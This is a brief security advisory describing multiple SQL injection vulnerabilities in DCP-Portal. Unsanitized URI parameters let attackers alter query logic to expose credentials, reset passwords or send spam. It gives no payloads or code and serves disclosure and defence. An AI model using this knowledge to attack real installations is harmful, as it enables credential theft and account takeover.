Multiple SQL Injection vulnerabilities have been discovered that affect DCP-Portal scripts. These issues are likely due to a lack of sufficient sanitization performed on user supplied URI parameters. Attacks have been demonstrated that inject partial SQL queries, as values for URI parameters, in a manner that influences DCP-Portal SQL query logic to the attackers benefit.

An attacker may exploit these conditions to disclose DCP Portal credentials, reset user passwords, or perform a denial of service type attack via email spamming.
